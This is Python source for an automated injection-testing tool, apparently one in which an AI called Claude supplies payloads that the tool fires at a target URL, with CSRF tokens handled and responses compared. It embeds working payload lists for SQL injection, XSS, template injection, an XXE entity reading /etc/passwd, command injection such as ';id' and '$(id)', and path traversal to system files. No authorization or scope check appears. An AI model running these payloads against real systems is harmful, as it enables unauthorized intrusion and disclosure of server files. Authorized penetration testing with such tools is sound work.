"""
Hunter v5 — Injection Tester (Enhanced)

Claude provides payloads, tool sends them and compares responses.
Supports: SQLi, XSS, SSTI, XXE, and custom injection types.

Fixes:
- GET mode URL encoding (no double encoding)
- XML Content-Type support
- JSON Content-Type support
- Multipart form support
"""

import hashlib
import json as _json
import time
import re as _re

from tools.probe import _get_session

# Common CSRF token patterns
CSRF_PATTERNS = [
    r'name=[\'"]csrf[\'"][^>]*value=[\'"]([^\'"]+)[\'"]',
    r'name=[\'"]csrf_token[\'"][^>]*value=[\'"]([^\'"]+)[\'"]',
    r'name=[\'"]_token[\'"][^>]*value=[\'"]([^\'"]+)[\'"]',
    r'"csrf"\s*:\s*"([^"]+)"',
    r"name=['\"]__RequestVerificationToken['\"][^>]*value=['\"]([^'\"]+)",
]


def extract_csrf_token(html):
    """Extract CSRF token from HTML response."""
    for pattern in CSRF_PATTERNS:
        match = _re.search(pattern, html, _re.IGNORECASE)
        if match:
            return match.group(1)
    return ""


def inject_impl(url: str, method: str = "POST", param: str = "",
                payloads: list = None, base_payload: str = "test",
                compare_field: str = "body_length", headers: dict = None,
                body_template: str = "", timeout: int = 10,
                vuln_type: str = "", db_type: str = "generic",
                waf_name: str = "",
                csrf_token: str = "", csrf_param: str = "csrf",
                inject_mode: str = "auto",
                content_type: str = "") -> dict:
    """Test injection vulnerabilities by sending payloads and comparing responses.

    If payloads not provided, auto-generates based on vuln_type and context.

    content_type: Override Content-Type
        - "xml": application/xml (for XXE)
        - "json": application/json
        - "form": application/x-www-form-urlencoded (default)
        - "multipart": multipart/form-data
        - any other string: used directly as Content-Type
    """
    from tools.auto_sqli import AutoSQLi
    from tools.auto_ssti import AutoSSTI

    # Auto-generate payloads if not provided
    if not payloads and vuln_type:
        try:
            from core.smart_payload import SmartPayloadGenerator
            generator = SmartPayloadGenerator()
            result = generator.get_payloads_for_vuln(vuln_type, {
                "db_type": db_type,
                "waf_name": waf_name,
            })
            payloads = result.get("payloads", [])
        except ImportError:
            # Fallback payload generation
            payloads = _generate_fallback_payloads(vuln_type)

    if not payloads:
        return {"error": "No payloads provided. Pass payloads or vuln_type."}

    session = _get_session()
    start = time.time()

    # Auto-extract CSRF token if needed
    if inject_mode == "auto" and method.upper() == "POST" and not csrf_token:
        try:
            resp = session.get(url, timeout=timeout)
            csrf_token = extract_csrf_token(resp.text)
            if csrf_token:
                inject_mode = "csrf_body"
            else:
                inject_mode = "body"
        except:
            inject_mode = "body"
    elif inject_mode == "auto":
        inject_mode = "query" if method.upper() == "GET" else "body"

    # Determine content type
    effective_content_type = _resolve_content_type(content_type, inject_mode, method)

    base_result = _send_injection(session, url, method, param, base_payload,
                                  headers, body_template, timeout,
                                  content_type=effective_content_type)

    results = []
    for payload in payloads:
        result = _send_injection(session, url, method, param, payload,
                                 headers, body_template, timeout,
                                 inject_mode, csrf_token, csrf_param,
                                 content_type=effective_content_type)
        diff = _compute_diff(base_result, result, compare_field)
        result["diff_from_base"] = diff
        result["interesting"] = _is_injection_interesting(diff, result, base_result)
        results.append(result)

    analysis = _analyze_injection(results, base_result, compare_field)
    elapsed_ms = int((time.time() - start) * 1000)

    return {
        "url": url,
        "param": param,
        "inject_mode": inject_mode,
        "content_type": effective_content_type,
        "csrf_token": csrf_token[:20] + "..." if csrf_token else None,
        "base_response": {
            "status": base_result["status"],
            "body_length": base_result["body_length"],
            "body_preview": base_result["body"][:200],
        },
        "results": results,
        "analysis": analysis,
        "elapsed_ms": elapsed_ms,
    }


def _resolve_content_type(content_type: str, inject_mode: str, method: str) -> str:
    """Resolve the effective content type."""
    if content_type:
        mapping = {
            "xml": "application/xml",
            "json": "application/json",
            "form": "application/x-www-form-urlencoded",
            "multipart": "multipart/form-data",
        }
        return mapping.get(content_type, content_type)

    if inject_mode == "xml" or inject_mode == "xxe":
        return "application/xml"

    return ""  # Let the function decide based on method


def _generate_fallback_payloads(vuln_type: str) -> list:
    """Generate fallback payloads when SmartPayloadGenerator is unavailable."""
    payload_map = {
        "sqli": [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND SLEEP(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
        ],
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
        ],
        "ssti": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        ],
        "cmdi": [
            "|id",
            ";id",
            "$(id)",
            "`id`",
        ],
        "lfi": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ],
    }
    return payload_map.get(vuln_type, [])


def _send_injection(session, url: str, method: str, param: str, payload: str,
                    headers: dict, body_template: str, timeout: int,
                    inject_mode: str = "body", csrf_token: str = "",
                    csrf_param: str = "csrf",
                    content_type: str = "") -> dict:
    """Send a single injection payload."""
    try:
        effective_headers = dict(headers or {})

        # Determine content type
        if not content_type:
            if method.upper() == "GET":
                content_type_use = ""
            else:
                content_type_use = "application/x-www-form-urlencoded"
        else:
            content_type_use = content_type

        if method.upper() == "GET":
            # For GET, don't double-encode - pass raw payload in URL
            separator = "&" if "?" in url else "?"
            target_url = f"{url}{separator}{param}={payload}"
            resp = session.get(target_url, headers=effective_headers or {},
                               timeout=timeout, allow_redirects=False)
        else:
            # Build body based on content type
            if content_type_use == "application/xml" or content_type_use == "text/xml":
                # XML body - payload is the full XML
                if body_template:
                    body = body_template.replace("{payload}", payload)
                else:
                    body = payload
                effective_headers.setdefault("Content-Type", content_type_use)
            elif content_type_use == "application/json":
                # JSON body
                if body_template:
                    # Template like '{"param": "{payload}"}'
                    body = body_template.replace("{payload}", payload)
                else:
                    body = _json.dumps({param: payload})
                effective_headers.setdefault("Content-Type", content_type_use)
            else:
                # Form-encoded body
                if inject_mode == "csrf_body" and csrf_token:
                    body = f"{csrf_param}={csrf_token}&{param}={payload}"
                elif body_template:
                    body = body_template.replace("{payload}", payload)
                else:
                    body = f"{param}={payload}"
                effective_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

            resp = session.post(url, data=body, headers=effective_headers,
                                timeout=timeout, allow_redirects=False)

        full_body = resp.text
        body_truncated = full_body[:10240] if len(full_body) > 10240 else full_body

        return {
            "payload": payload,
            "status": resp.status_code,
            "body": body_truncated,
            "body_length": len(full_body),
            "body_hash": hashlib.md5(full_body.encode()).hexdigest()[:8],
            "redirect": resp.headers.get("Location"),
            "headers": dict(resp.headers),
        }
    except Exception as e:
        return {
            "payload": payload,
            "status": 0,
            "body": "",
            "body_length": 0,
            "body_hash": "",
            "redirect": None,
            "headers": {},
            "error": str(e),
        }


def _compute_diff(base: dict, result: dict, compare_field: str) -> str:
    """Compute difference between base and result."""
    if compare_field == "body_length":
        diff = result["body_length"] - base["body_length"]
        if diff > 0:
            return f"+{diff} bytes"
        elif diff < 0:
            return f"{diff} bytes"
        if result.get("body", "") != base.get("body", ""):
            return "different content (same length)"
        return "0 bytes"

    elif compare_field == "body_hash":
        if result["body_hash"] != base["body_hash"]:
            return "different content"
        return "same content"

    elif compare_field == "status_code":
        if result["status"] != base["status"]:
            return f"status changed: {base['status']} → {result['status']}"
        return "same status"

    elif compare_field == "redirect":
        if result["redirect"] != base["redirect"]:
            return f"redirect changed: {base['redirect']} → {result['redirect']}"
        return "same redirect"

    return "unknown"


def _is_injection_interesting(diff: str, result: dict, base: dict) -> bool:
    """Determine if injection result is interesting."""
    if "bytes" in diff and diff != "0 bytes":
        return True
    if diff == "different content":
        return True
    if "status changed" in diff:
        return True
    if result.get("redirect") and not base.get("redirect"):
        return True
    error_patterns = ["sql", "syntax", "mysql", "postgresql", "ora-", "sqlite",
                      "template", "jinja", "mako", "twig", "expression",
                      "freemarker", "velocity", "thymeleaf",
                      "xml", "entity", "dtd", "xxe",
                      "command", "exec", "system", "popen"]
    body_lower = result.get("body", "").lower()
    if any(p in body_lower for p in error_patterns):
        return True
    return False


def _analyze_injection(results: list, base: dict, compare_field: str) -> dict:
    """Analyze injection results to determine if vulnerability is likely."""
    interesting_count = sum(1 for r in results if r["interesting"])

    if interesting_count == 0:
        return {
            "likely_vuln": False,
            "type": None,
            "confidence": 0.0,
            "evidence": "No differential responses detected",
        }

    has_longer = any(r["body_length"] > base["body_length"] for r in results if r["interesting"])
    has_shorter = any(r["body_length"] < base["body_length"] for r in results if r["interesting"])

    if has_longer and has_shorter:
        return {
            "likely_vuln": True,
            "type": "boolean-based blind",
            "confidence": 0.8,
            "evidence": f"Differential responses: {interesting_count}/{len(results)} payloads show differences",
        }

    error_payloads = [r for r in results if any(
        p in r.get("body", "").lower()
        for p in ["sql", "syntax", "mysql", "template", "expression",
                  "xml", "entity", "command"]
    )]
    if error_payloads:
        return {
            "likely_vuln": True,
            "type": "error-based",
            "confidence": 0.7,
            "evidence": f"Error messages found in {len(error_payloads)} responses",
        }

    return {
        "likely_vuln": True,
        "type": "unknown",
        "confidence": 0.5,
        "evidence": f"{interesting_count}/{len(results)} payloads show differential responses",
    }
